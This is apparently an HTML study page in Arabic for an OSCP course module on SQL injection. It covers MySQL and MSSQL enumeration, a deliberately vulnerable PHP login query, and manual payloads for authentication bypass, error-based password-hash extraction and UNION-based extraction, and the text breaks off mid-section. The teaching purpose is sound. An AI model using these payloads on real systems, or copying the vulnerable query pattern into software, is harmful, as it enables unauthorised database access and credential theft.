@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 8: هجمات SQL Injection</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0: #0B0B0D;
+    --bg-1: #121214;
+    --surface: #17171A;
+    --surface-2: #1D1D21;
+    --border: #2A2A2F;
+    --border-soft: #232326;
+
+    --text: #E6E6E9;
+    --text-soft: #C4C4CA;
+    --muted: #8A8A92;
+
+    --red: #E1362F;
+    --red-soft: rgba(225,54,47,0.10);
+    --red-border: rgba(225,54,47,0.35);
+    --red-grad: linear-gradient(90deg, #E1362F, #F2794A);
+
+    --amber: #E8A23A;
+    --amber-soft: rgba(232,162,58,0.09);
+    --amber-border: rgba(232,162,58,0.30);
+
+    --green: #3FBF6E;
+
+    --mono: 'IBM Plex Mono', 'Courier New', monospace;
+  }
+
+  * { box-sizing: border-box; }
+
+  html, body {
+    margin: 0;
+    padding: 0;
+    direction: rtl;
+    text-align: right;
+    background: var(--bg-0);
+  }
+
+  body {
+    font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+    line-height: 1.95;
+    font-size: 16.5px;
+    color: var(--text);
+    background:
+      radial-gradient(900px 420px at 12% -8%, rgba(225,54,47,0.10), transparent 60%),
+      radial-gradient(800px 420px at 90% 6%, rgba(232,162,58,0.06), transparent 60%),
+      linear-gradient(180deg, var(--bg-0) 0%, var(--bg-1) 100%);
+    background-attachment: fixed;
+  }
+
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 46px 22px 100px;
+  }
+
+  .banner {
+    position: relative;
+    overflow: hidden;
+    background: linear-gradient(155deg, #17171A 0%, #141416 55%, #18151A 100%);
+    border: 1px solid var(--border-soft);
+    border-radius: 10px;
+    padding: 0 0 34px;
+    margin-bottom: 26px;
+    box-shadow: 0 20px 50px -20px rgba(0,0,0,0.6);
+  }
+  .term-bar {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 13px 18px;
+    border-bottom: 1px solid var(--border-soft);
+    background: rgba(255,255,255,0.015);
+    direction: ltr;
+  }
+  .term-dot { width: 11px; height: 11px; border-radius: 50%; display: inline-block; }
+  .term-dot.r { background: #E1362F; }
+  .term-dot.y { background: #E8A23A; }
+  .term-dot.g { background: #3FBF6E; }
+  .term-path {
+    margin-inline-start: 12px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--muted);
+  }
+  .banner-body { padding: 30px 34px 4px; }
+  .banner .kicker {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    letter-spacing: 0.03em;
+    color: var(--red);
+    background: var(--red-soft);
+    border: 1px solid var(--red-border);
+    border-radius: 3px;
+    padding: 5px 12px;
+    margin-bottom: 20px;
+    direction: ltr;
+  }
+  .banner h1 {
+    margin: 0 0 14px;
+    font-size: 28px;
+    font-weight: 800;
+    line-height: 1.5;
+    color: #F4F4F6;
+  }
+  .banner .lede {
+    color: var(--muted);
+    font-size: 15.5px;
+    line-height: 1.95;
+    max-width: 620px;
+    margin: 0 0 24px;
+  }
+  .tags { display: flex; flex-wrap: wrap; gap: 9px; }
+  .tag {
+    font-size: 12.5px;
+    font-family: var(--mono);
+    color: var(--amber);
+    background: var(--amber-soft);
+    border: 1px solid var(--amber-border);
+    border-radius: 3px;
+    padding: 5px 11px;
+  }
+
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border-soft);
+    border-radius: 8px;
+    padding: 6px 0 6px;
+    margin-bottom: 50px;
+    overflow: hidden;
+  }
+  .toc-title {
+    font-family: var(--mono);
+    font-weight: 600;
+    font-size: 13px;
+    color: var(--green);
+    padding: 14px 22px;
+    border-bottom: 1px solid var(--border-soft);
+    direction: ltr;
+    text-align: left;
+  }
+  .toc-list { display: flex; flex-direction: column; }
+  .toc-item {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 12px 22px;
+    color: var(--text-soft);
+    text-decoration: none;
+    font-size: 14.5px;
+    border-bottom: 1px solid rgba(255,255,255,0.03);
+    transition: background 0.15s ease, padding-inline-start 0.15s ease;
+  }
+  .toc-list .toc-item:last-child { border-bottom: none; }
+  .toc-item:hover { background: rgba(225,54,47,0.06); }
+  .toc-num {
+    flex: none;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    font-weight: 600;
+    color: #0F0F10;
+    background: var(--red-grad);
+    border-radius: 3px;
+    padding: 3px 8px;
+    direction: ltr;
+  }
+
+  h1, h2, h3, h4 { font-weight: 700; }
+
+  h2 {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    font-size: 21px;
+    margin: 66px 0 22px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border-soft);
+    color: #F0F0F2;
+  }
+  h2 .num {
+    flex: none;
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 700;
+    color: #0F0F10;
+    background: var(--red-grad);
+    border-radius: 5px;
+    padding: 7px 12px;
+    direction: ltr;
+  }
+  h2 .htext { line-height: 1.5; }
+
+  h3 {
+    font-size: 17px;
+    margin: 34px 0 14px;
+    color: var(--red);
+    display: flex;
+    align-items: center;
+    gap: 9px;
+  }
+  h3::before {
+    content: "#";
+    font-family: var(--mono);
+    color: var(--amber);
+    font-weight: 700;
+  }
+
+  h4 {
+    font-size: 14.8px;
+    margin: 22px 0 10px;
+    color: var(--text-soft);
+    font-family: var(--mono);
+  }
+
+  p { margin: 0 0 17px; color: var(--text); }
+
+  strong { color: #FBFBFC; font-weight: 700; }
+
+  a { color: var(--amber); text-decoration: none; border-bottom: 1px dashed var(--amber-border); }
+
+  hr {
+    border: none;
+    height: 1px;
+    margin: 50px 0;
+    background: linear-gradient(90deg, transparent, var(--border), transparent);
+  }
+
+  ul, ol {
+    margin: 0 0 18px;
+    padding-inline-start: 24px;
+  }
+  li { margin-bottom: 9px; color: var(--text); }
+  li::marker { color: var(--red); font-family: var(--mono); }
+  li > ul, li > ol { margin-top: 9px; }
+
+  blockquote {
+    margin: 24px 0;
+    padding: 17px 22px;
+    background: var(--red-soft);
+    border: 1px solid var(--red-border);
+    border-inline-start: 3px solid var(--red);
+    border-radius: 6px;
+    color: #EAD9D7;
+  }
+  blockquote p { margin: 0; color: inherit; line-height: 1.85; }
+  blockquote strong { color: #FFB4AE; }
+
+  .table-wrap {
+    overflow-x: auto;
+    margin: 22px 0;
+    border: 1px solid var(--border-soft);
+    border-radius: 8px;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 14.2px;
+    min-width: 480px;
+  }
+  thead th {
+    background: var(--surface-2);
+    color: var(--amber);
+    font-weight: 700;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    text-transform: uppercase;
+    letter-spacing: 0.02em;
+    text-align: start;
+    padding: 13px 15px;
+    border-bottom: 1px solid var(--border-soft);
+    white-space: nowrap;
+  }
+  tbody td {
+    padding: 12px 15px;
+    border-bottom: 1px solid var(--border-soft);
+    color: var(--text-soft);
+    vertical-align: top;
+  }
+  tbody tr:last-child td { border-bottom: none; }
+  tbody tr:nth-child(even) { background: rgba(255,255,255,0.012); }
+  tbody tr:hover { background: rgba(225,54,47,0.045); }
+
+  code {
+    font-family: var(--mono);
+    font-size: 13.3px;
+    background: var(--surface-2);
+    border: 1px solid var(--border-soft);
+    border-radius: 4px;
+    padding: 2px 6px;
+    direction: ltr;
+    unicode-bidi: embed;
+    color: var(--green);
+  }
+  .code-wrap { overflow-x: auto; margin: 22px 0; }
+  pre {
+    background: #0E0E10;
+    border: 1px solid var(--border-soft);
+    border-inline-start: 3px solid var(--red);
+    border-radius: 8px;
+    padding: 18px 22px;
+    direction: ltr;
+    text-align: left;
+    margin: 0;
+  }
+  pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: #B9E8C9;
+    font-size: 13.2px;
+    line-height: 1.75;
+  }
+
+  .footer-note {
+    margin-top: 70px;
+    padding-top: 26px;
+    border-top: 1px solid var(--border-soft);
+    color: var(--muted);
+    font-size: 13.3px;
+    font-family: var(--mono);
+    text-align: center;
+    direction: ltr;
+  }
+
+  @media (max-width: 640px) {
+    .page { padding: 28px 14px 70px; }
+    .banner-body { padding: 24px 20px 4px; }
+    .banner h1 { font-size: 21px; }
+    h2 { font-size: 18px; gap: 10px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <div class="banner">
+    <div class="term-bar">
+      <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+      <span class="term-path">root@oscp:~/module-08$</span>
+    </div>
+    <div class="banner-body">
+      <span class="kicker">OSCP · PEN-200 · Module 08</span>
+      <h1>هجمات SQL Injection</h1>
+      <p class="lede">أساسيات MySQL وMSSQL، تجاوز التوثيق، الاستغلال المبني على الأخطاء وUNION، الحقن الأعمى (Boolean وTime-based)، ووصولًا للاستغلال الآلي والـ RCE بـ sqlmap.</p>
+      <div class="tags">
+        <span class="tag">mysql-mssql</span>
+        <span class="tag">union-based</span>
+        <span class="tag">error-based</span>
+        <span class="tag">blind-sqli</span>
+        <span class="tag">sqlmap</span>
+      </div>
+    </div>
+  </div>
+
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+<a class="toc-item" href="#lu1"><span class="toc-num">01</span><span class="toc-label">أساسيات قواعد البيانات ومفاهيم SQL</span></a>
+<a class="toc-item" href="#lu2"><span class="toc-num">02</span><span class="toc-label">استغلال SQL Injection يدويًا</span></a>
+<a class="toc-item" href="#lu3"><span class="toc-num">03</span><span class="toc-label">طرق الاستغلال الآلي (Manual and Automated Code Execution)</span></a>
+<a class="toc-item" href="#summary"><span class="toc-num">--</span><span class="toc-label">الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<h1>Module 8: هجمات SQL Injection (SQL Injection Attacks)</h1>
+<blockquote>
+<p><strong>SQL Injection (SQLi)</strong> واحدة من أخطر العيوب الأمنية اللي بتأثر على تطبيقات الويب. بتظهر باستمرار ضمن أعلى المخاطر في OWASP Top 10، ومصنَّفة تحت <strong>A03:2021 – Injection</strong>.</p>
+</blockquote>
+<p>في جوهرها، ثغرة SQL injection بتسمح لمستخدم خبيث يتدخّل في استعلامات قاعدة البيانات اللي التطبيق بيبعتها لقاعدة بياناته الخلفية. بالتلاعب في حقول المدخل، المهاجم يقدر يغيّر منطق الاستعلام المقصود، محتمل يوصل، يعدّل، أو يستخرج بيانات المفروض تفضل محمية.</p>
+<p>في الموديول ده، هنستكشف تقنيات اكتشاف ثغرات SQL injection، تحديد تقنيات قاعدة البيانات (fingerprinting)، وتنفيذ اختبار يدوي واستغلال بمساعدة أدوات.</p>
+<hr />
+<h2 id="lu1"><span class="num">01</span><span class="htext">أساسيات قواعد البيانات ومفاهيم SQL</span></h2>
+<h3>أهداف الوحدة</h3>
+<p>مراجعة مبادئ Structured Query Language (SQL) الأساسية | استكشاف أنظمة إدارة قواعد بيانات مختلفة والفروق بينها | التعرّف على اختلافات صياغة SQL عبر منصات قواعد البيانات</p>
+<h3>أساسيات SQL — مراجعة سريعة</h3>
+<p><strong>SQL</strong> هي اللغة القياسية المستخدَمة للتواصل مع أنظمة قواعد البيانات العلائقية. بتمكّن المسؤولين والتطبيقات من قراءة البيانات، إضافة سجلات جديدة، تحديث معلومات موجودة، حذف إدخالات، وإدارة بنية قاعدة البيانات.</p>
+<blockquote>
+<p>بما إن محركات قواعد البيانات غالبًا بتشتغل بصلاحيات مرتفعة، إساءة استخدام جمل SQL ممكن تقدّم تعرّضات أمنية خطيرة لما المدخل ما يتعاملش معاه بأمان.</p>
+</blockquote>
+<h3>إزاي تطبيقات الويب بتتفاعل مع قواعد البيانات</h3>
+<p>معظم منصات الويب الحديثة بتتبع معمارية متعددة الطبقات:</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>الطبقة</th>
+<th>الوصف</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Client Layer (Frontend)</strong></td>
+<td>الواجهة الظاهرة اللي المستخدمين بيتفاعلوا معاها في متصفحاتهم. عادةً مبنية بـ HTML، CSS، وJavaScript</td>
+</tr>
+<tr>
+<td><strong>Application Layer (Backend)</strong></td>
+<td>بعد أفعال المستخدم (زي تقديم نموذج)، البيانات بتتبعت لكود server-side. الطبقة دي بتعالج الطلبات باستخدام frameworks ولغات برمجة زي PHP، Java، أو Python</td>
+</tr>
+<tr>
+<td><strong>Data Layer (Database)</strong></td>
+<td>الـ backend بيتواصل مع قاعدة البيانات لتخزين أو استرجاع معلومات — مثلًا، التحقق من بيانات تسجيل الدخول بفحص هل اسم المستخدم والباسورد بيطابقوا سجلات مخزَّنة</td>
+</tr>
+</tbody>
+</table></div>
+<h3>الفروق بين أنظمة قواعد البيانات</h3>
+<p>رغم إن SQL موحَّدة، كل منصة قاعدة بيانات بتنفّذ لهجتها الخاصة بميزات واختلافات صياغة فريدة. أنظمة قواعد بيانات علائقية واسعة الاستخدام تشمل:</p>
+<p><strong>MySQL | Microsoft SQL Server | PostgreSQL | Oracle Database</strong></p>
+<blockquote>
+<p>فهم الاختلافات دي مهم لأن سلوك الاستعلام، الدوال، وتقنيات الاستغلال ممكن تختلف عبر المنصات.</p>
+</blockquote>
+<h3>مثال استعلام SQL أساسي</h3>
+<p>اعتبر جدول قاعدة بيانات اسمه <code>users</code>. لاسترجاع كل الأعمدة لحساب محدد (مثلًا مستخدم اسمه <code>leon</code>):</p>
+<div class="code-wrap"><pre><code class="language-sql">SELECT * FROM users WHERE user_name = 'leon';
+</code></pre></div>
+<p><strong>الشرح:</strong>
+- <code>SELECT *</code> → بيطلب كل الأعمدة
+- <code>FROM users</code> → بيحدد الجدول
+- <code>WHERE</code> → بيفلتر النتائج بناءً على شرط</p>
+<h3>استعلامات SQL مُضمَّنة في كود التطبيق</h3>
+<p>تطبيقات الويب نادرًا ما بتنفّذ استعلامات مستقلة. بدل كده، أوامر قاعدة البيانات بتتبنى ديناميكيًا جوه سكربتات server-side. مثلًا، أثناء عملية تسجيل دخول، كود الـ backend ممكن يجمّع بيانات اعتماد مُقدَّمة عبر نموذج ويبني استعلام للتحقق منها:</p>
+<div class="code-wrap"><pre><code class="language-php">&lt;?php
+$username = $_POST['uname'];
+$password = $_POST['password'];
+$query = &quot;SELECT * FROM users WHERE user_name='$username' AND password='$password'&quot;;
+$result = mysqli_query($connection, $query);
+?&gt;
+</code></pre></div>
+<p><strong>إليك إيه اللي بيحصل:</strong></p>
+<ol>
+<li>التطبيق بيستلم مدخل من المستخدم</li>
+<li>المدخل بيتضاف مباشرة جوه جملة SQL</li>
+<li>الاستعلام بيتبعت لقاعدة البيانات للتنفيذ</li>
+<li>النتيجة بتحدد هل التوثيق نجح</li>
+</ol>
+<blockquote>
+<p>دالة <code>mysqli_query</code> بتنفّذ الأمر مقابل قاعدة البيانات (الـ "i" بتشير لـ "improved"، إشارة لـ MySQLi extension).</p>
+</blockquote>
+<h3>ليه ده ممكن يكون خطير</h3>
+<p>لو مدخل المستخدم بيتضاف لاستعلام من غير تحقق أو تنقية، التطبيق بيبقى عرضة للخطر. المهاجم يقدر يقدّم مدخل مصمَّم يحتوي صياغة SQL، مغيّرًا منطق الأمر المقصود.</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>النوع</th>
+<th>المدخل</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>عادي</strong></td>
+<td><code>leon</code></td>
+</tr>
+<tr>
+<td><strong>خبيث</strong></td>
+<td><code>leon' OR '1'='1</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>من غير ضمانات سليمة، قاعدة البيانات هتنفّذ الاستعلام المعدَّل، واللي ممكن يتخطى التوثيق أو يعرّض بيانات حساسة. حروف خاصة، مُعاملات، وجمل SQL إضافية كلهم ممكن يُستخدموا للتلاعب في إزاي قاعدة البيانات بتفسّر الجملة.</p>
+<blockquote>
+<p>التفاعل ده بين مدخل المستخدم، كود التطبيق، واستعلامات قاعدة البيانات بيشكّل أساس ثغرات SQL injection.</p>
+</blockquote>
+<hr />
+<h3>أنواع قواعد البيانات وخصائصها</h3>
+<p>أثناء تقييم أمني، المختبرين غالبًا مش عارفين أنهي تقنية قاعدة بيانات بتشغّل التطبيق المستهدف. عشان كده، مهم نفهم إزاي نتفاعل مع تطبيقات SQL متعددة، بما إن كل واحدة ليها أوامرها، قواعد صياغتها، وقدراتها المدمجة.</p>
+<p>في القسم ده، التركيز على نظامين واسعي الانتشار: <strong>MySQL</strong> (وفرعها <strong>MariaDB</strong>) و<strong>Microsoft SQL Server (MSSQL)</strong>.</p>
+<h3>نظرة عامة على MySQL</h3>
+<p>MySQL من أكتر قواعد البيانات العلائقية استخدامًا في تطوير الويب. نظيرتها مفتوحة المصدر، MariaDB، بتحافظ على التوافق مع تقديم تحسينات إضافية.</p>
+<p><strong>الاتصال بسيرفر MySQL بعيد:</strong></p>
+<div class="code-wrap"><pre><code class="language-bash">mysql -h &lt;target_ip&gt; -u &lt;username&gt; -p -P 3306
+</code></pre></div>
+<p>(البورت الافتراضي 3306). بمجرد الاتصال، الكونسول التفاعلي بيسمح بتنفيذ جمل SQL مباشرة مقابل قاعدة البيانات.</p>
+<p><strong>جمع معلومات النظام:</strong></p>
+<div class="code-wrap"><pre><code class="language-sql">SELECT version();       -- يكشف إصدار محرك قاعدة البيانات
+SELECT system_user();   -- يوضّح الحساب الموثَّق ومصدره
+</code></pre></div>
+<p>التفاصيل دي بتساعد في تحديد مستويات الصلاحيات وسطح الهجوم المحتمل.</p>
+<blockquote>
+<p><strong>ملاحظة مهمة:</strong> حساب "root" في قاعدة البيانات بيشير لصلاحيات إدارية <strong>جوه نظام قاعدة البيانات</strong> — مش بالضرورة تحكم كامل في نظام التشغيل.</p>
+</blockquote>
+<p><strong>عدّ قواعد البيانات المتاحة:</strong></p>
+<div class="code-wrap"><pre><code class="language-sql">SHOW DATABASES;
+</code></pre></div>
+<p>بيسرد كل الـ schemas القابلة للوصول، بما فيها قواعد بيانات النظام وأي قواعد مخصَّصة أنشأها المطورين.</p>
+<p><strong>استخراج اعتمادات مخزَّنة (مثال):</strong></p>
+<p>جوه قاعدة بيانات النظام، تفاصيل حسابات المستخدمين ممكن تكون مخزَّنة في جداول مخصَّصة:</p>
+<div class="code-wrap"><pre><code class="language-sql">SELECT user, authentication_string
+FROM mysql.user
+WHERE user = 'BadGlitch';
+</code></pre></div>
+<blockquote>
+<p>الباسوردات عادةً مخزَّنة كـ hashes تشفيرية (مثلًا Caching-SHA-256)، مش نص واضح. الـ hashes دي بتمثّل نسخ مُرمَّزة من الباسورد الأصلي ومصمَّمة تمنع الكشف المباشر لو قاعدة البيانات اتعرّضت.</p>
+</blockquote>
+<h3>نظرة عامة على Microsoft SQL Server (MSSQL)</h3>
+<p>MSSQL مدمج بشكل وثيق مع نظام Windows البيئي وشائع الاستخدام في بيئات المؤسسات.</p>
+<p>أنظمة Windows بتشمل أدوات سطر أوامر للتفاعل مع قواعد البيانات، بينما مختبري الاختراق غالبًا بيعتمدوا على أدوات متخصصة للاتصال عن بُعد. واحدة من الأدوات دي هي <strong>Impacket</strong>، اللي بتدعم بروتوكول <strong>Tabular Data Stream (TDS)</strong> المستخدَم من سيرفرات MSSQL.</p>
+<div class="code-wrap"><pre><code class="language-bash"># مثال اتصال عبر Impacket
+mssqlclient.py &lt;username&gt;@&lt;target_ip&gt; -windows-auth
+</code></pre></div>
+<p><strong>تحديد إصدار النظام:</strong></p>
+<p>MSSQL بتوفّر متغيّرات نظام بتكشف معلومات تفصيلية عن محرك قاعدة البيانات ونظام التشغيل الأساسي:</p>
+<div class="code-wrap"><pre><code class="language-sql">SELECT @@version;
+</code></pre></div>
+<p>الخرج ده غالبًا بيشمل: إصدار وbuild الـ SQL Server | إصدار نظام التشغيل | تفاصيل البنية (architecture). المعلومة دي قيّمة لبحث الثغرات وتخطيط الاستغلال.</p>
+<p><strong>سرد قواعد البيانات:</strong></p>
+<div class="code-wrap"><pre><code class="language-sql">SELECT name FROM sys.databases;
+</code></pre></div>
+<p><strong>قواعد البيانات الافتراضية عادةً بتشمل:</strong> <code>master</code> | <code>tempdb</code> | <code>model</code> | <code>msdb</code></p>
+<p>قواعد البيانات المخصَّصة ممكن تحتوي بيانات التطبيق وغالبًا بتبقى الهدف الأساسي أثناء الاختبار.</p>
+<p><strong>فحص الجداول والسجلات:</strong></p>
+<div class="code-wrap"><pre><code class="language-sql">-- بعد تحديد قاعدة بيانات مثيرة للاهتمام، عدّ جداولها عبر information schema
+SELECT * FROM net.information_schema.tables;
+
+-- بعدين استرجع البيانات المخزَّنة
+SELECT * FROM net.dbo.users;
+</code></pre></div>
+<blockquote>
+<p>حسب الإعداد، معلومات حساسة زي أسماء مستخدمين وباسوردات ممكن تكون مخزَّنة <strong>كنص واضح</strong> — إعداد خاطئ أمني خطير.</p>
+</blockquote>
+<p>منصات قواعد البيانات المختلفة بتنفّذ SQL بطرق متمايزة، بتأثر على الأوامر، الدوال، وتقنيات الـ enumeration. التعرّف على الاختلافات دي أساسي لما بنفحص ثغرات injection أو نستخرج بيانات أثناء تقييم.</p>
+<hr />
+<h2 id="lu2"><span class="num">02</span><span class="htext">استغلال SQL Injection يدويًا</span></h2>
+<h3>أهداف الوحدة</h3>
+<p>اكتشاف عيوب SQL injection من غير أدوات آلية | فهم تقنيات حقن UNION-based | استكشاف طرق SQL injection القائمة على الأخطاء (error-driven) | تعلّم أساسيات blind SQL injection</p>
+<p>بعد مراجعة أساسيات قاعدة البيانات والاختلافات في الصياغة بين المنصات الأساسية، الخطوة الجاية هي تعلّم إزاي المهاجمين يدويًا بيكتشفوا ويستغلوا نقاط ضعف SQL injection.</p>
+<blockquote>
+<p>رغم إن أطر آلية زي sqlmap تقدر تحدد ثغرات بسرعة، الاختبار اليدوي أساسي لفهم إزاي العيوب دي فعليًا بتشتغل وإزاي الـ payloads بتتلاعب في الاستعلامات الخلفية.</p>
+</blockquote>
+<h3>اكتشاف SQL Injection عبر رسائل الخطأ</h3>
+<p>اعتبر سكربت تسجيل دخول مكتوب بـ PHP بيبني استعلام قاعدة بيانات باستخدام مدخل مُقدَّم من المستخدم (زي المثال اللي فات). بما إن التطبيق بيضيف مدخل المستخدم مباشرة في جملة SQL من غير تحقق أو parameterization، المهاجم يقدر يغيّر منطق الاستعلام.</p>
+<h3>تقنية تجاوز التوثيق (Authentication Bypass)</h3>
+<p>واحد من أشيع مسارات الاستغلال الأولية هو تجاوز ضوابط تسجيل الدخول. بحقن مدخل مصمَّم بيقفل السلسلة الأصلية ويضيف شرط دايمًا بيُقيَّم كـ <code>TRUE</code>، المهاجم يقدر يجبر قاعدة البيانات ترجّع سجل صالح.</p>
+<p><strong>مثال Payload:</strong></p>
+<div class="code-wrap"><pre><code class="language-sql">BadGlitch' OR 1=1 -- //
+</code></pre></div>
+<p><strong>إيه اللي بيحصل داخليًا:</strong></p>
+<p>قاعدة البيانات بتستقبل استعلام معدَّل شبيه بـ:</p>
+<div class="code-wrap"><pre><code class="language-sql">SELECT * FROM users WHERE user_name='BadGlitch' OR 1=1 -- //' AND password='...'
+</code></pre></div>
+<ul>
+<li><code>OR 1=1</code> دايمًا صح (TRUE)</li>
+<li>تسلسل التعليق (<code>--</code>) بيتجاهل باقي الجملة</li>
+<li>قاعدة البيانات بترجّع أول صف مطابق</li>
+</ul>
+<blockquote>
+<p>لو التطبيق بيمنح وصول بناءً بس على وجود نتيجة، التوثيق بيتخطى.</p>
+</blockquote>
+<h3>الفحص بالحروف الخاصة</h3>
+<p>قبل إطلاق payloads معقَّدة، المختبرين غالبًا بيفحصوا هل المدخل بيأثر على بنية الاستعلام. مثلًا، إدخال علامة اقتباس مفردة (<code>'</code>) في حقل ممكن يحفّز خطأ صياغة في قاعدة البيانات. الخطأ ده بيوحي بقوة إن مدخل المستخدم بيتفسّر كجزء من جملة SQL.</p>
+<blockquote>
+<p>لما التطبيقات بتعرض أخطاء قاعدة البيانات مباشرة، الثغرة بتبقى أسهل في الاستغلال. السيناريو ده معروف بـ <strong>in-band SQL injection</strong>، حيث المهاجم بيستقبل ردود قاعدة البيانات عبر واجهة التطبيق. الأنظمة الإنتاجية عادةً بتقمع الرسائل دي لأن كشفها بيسرّب معلومات حساسة.</p>
+</blockquote>
+<h3>Error-Based SQL Injection لاستخراج البيانات</h3>
+<p>بمجرد التأكيد، المهاجمين يقدروا يستخدموا ردود الخطأ لاسترجاع معلومات قاعدة البيانات.</p>
+<p><strong>استرجاع إصدار قاعدة البيانات:</strong></p>
+<div class="code-wrap"><pre><code class="language-sql">' OR 1=1 IN (SELECT @@version) -- //
+</code></pre></div>
+<p>الـ payload ده بيجبر قاعدة البيانات تقيّم subquery بيكشف إصدارها. لو التطبيق بيرجّع الخطأ أو الخرج الناتج، المهاجم بيحصل على رؤية عن بيئة قاعدة البيانات.</p>
+<p><strong>محاولة استرجاع جدول كامل:</strong></p>
+<div class="code-wrap"><pre><code class="language-sql">' OR 1=1 IN (SELECT * FROM users) -- //
+</code></pre></div>
+<p>لو الاستعلام فشل بسبب أعمدة متعددة، المهاجم بيعدّل الـ payload عشان يطلب عمود واحد بس:</p>
+<div class="code-wrap"><pre><code class="language-sql">' OR 1=1 IN (SELECT password FROM users) -- //
+</code></pre></div>
+<p>ده ممكن يكشف اعتمادات مُشفَّرة (hashed) مخزَّنة في قاعدة البيانات. لاستهداف حساب محدد:</p>
+<div class="code-wrap"><pre><code class="language-sql">' OR 1=1 IN (
+    SELECT password 
+    FROM users 
+    WHERE username='admin'
+) -- //
+</code></pre></div>
+<p>الاستعلام المُحسَّن ده بيعزل hash باسورد المدير.</p>
+<blockquote>
+<p><strong>ليه ده بيشتغل:</strong> الحقن المبني على الأخطاء بيعتمد على إن محرك قاعدة البيانات بيرجّع رسائل تفصيلية لما استعلام يفشل أو يتصرف بشكل غير متوقَّع. الرسائل دي ممكن تفصح بدون قصد عن: بنية قاعدة البيانات | أسماء الجداول | أسماء الأعمدة | البيانات المخزَّنة</p>
+</blockquote>
+<h3>Payloads من نوع UNION</h3>
+<p>لما التطبيق بيعرض نتائج استعلام قاعدة البيانات جوه خرجه العادي (in-band SQL injection)، المختبرين لازم يفحصوا هل حقن UNION-based ممكن.</p>
+<blockquote>
+<p>مُعامل <strong>SQL UNION</strong> بيسمح بدمج نتائج استعلام واحد مع خرج استعلام تاني. في سيناريوهات الاستغلال، ده بيمكّن المهاجمين من إضافة جملة <code>SELECT</code> خبيثة وعرض نتائجها جنب البيانات الشرعية.</p>
+</blockquote>
+<p><strong>متطلبات نجاح هجوم UNION:</strong></p>
+<ol>
+<li><strong>تطابق عدد الأعمدة (Matching Column Count)</strong> — الاستعلام المحقون لازم يرجّع نفس عدد أعمدة الاستعلام الأصلي</li>
+<li><strong>توافق أنواع البيانات (Compatible Data Types)</strong> — كل عمود مقابل لازم يقبل أنواع بيانات مشابهة (مثلًا نص مع نص، أرقام مع أرقام)</li>
+</ol>
+<blockquote>
+<p>لو أي شرط فشل، قاعدة البيانات هتولّد خطأ والهجوم مش هينجح.</p>
+</blockquote>
+<p><strong>مثال استعلام عرضة للخطر:</strong></p>
+<div class="code-wrap"><pre><code class="language-php">$query = &quot;SELECT * FROM customers WHERE name LIKE '&quot;.$_POST[&quot;search_input&quot;].&quot;%'&quot;;
+</code></pre></div>
+<p>ده بيسترجع سجلات عملاء أسماءهم بتبدأ بمدخل المستخدم (<code>%</code> بتعني "أي تسلسل حروف").</p>
+<h3>تحديد عدد الأعمدة</h3>
+<p>قبل صياغة UNION payload، المهاجم لازم يحدد كام عمود الاستعلام الأصلي بيرجّع. تقنية شائعة بتستخدم جملة <code>ORDER BY</code>:</p>
+<div class="code-wrap"><pre><code class="language-sql">' ORDER BY 1-- //
+</code></pre></div>
+<p>بزيادة الرقم خطوة بخطوة (<code>ORDER BY 2</code>، <code>ORDER BY 3</code>...إلخ)، المهاجم بيلاحظ إمتى خطأ بيحصل. أعلى رقم صالح بيكشف العدد الكلي للأعمدة. مثلًا:</p>
+<div class="code-wrap"><pre><code>ORDER BY 5  → يشتغل
+ORDER BY 6  → خطأ
+</code></pre></div>
+<p>ده بيدل على إن الاستعلام بيرجّع 5 أعمدة.</p>
+<h3>استخراج معلومات قاعدة البيانات بـ UNION</h3>
+<p>بعد تحديد عدد الأعمدة، المهاجم يقدر يحقن استعلام UNION بيرجّع بيانات نظام مفيدة:</p>
+<div class="code-wrap"><pre><code class="language-sql">%' UNION SELECT database(), user(), @@version, null, null -- //
+</code></pre></div>
+<p>ده بيحاول يعرض: اسم قاعدة البيانات الحالية | مستخدم قاعدة البيانات | إصدار قاعدة البيانات. باقي الأعمدة بتتملى بـ <code>null</code> للحفاظ على محاذاة الأعمدة.</p>
+<h3>التعامل مع عدم تطابق أنواع البيانات</h3>
+<p>أحيانًا النتائج ما بتظهرش لأن بعض الأعمدة بتتوقع قيم رقمية بدل نص (مثلًا حقول ID). لحل ده، المهاجمين بينقلوا الخرج النصي لأعمدة قادرة تعرض نصوص:</p>
+<div class="code-wrap"><pre><code class="language-sql">' UNION SELECT null, null, database(), user(), @@version -- //
+</code></pre></div>
+<p>بحط القيم في أعمدة متوافقة، الخرج بيبقى ظاهر.</p>
+<h3>عدّ بنية قاعدة البيانات</h3>
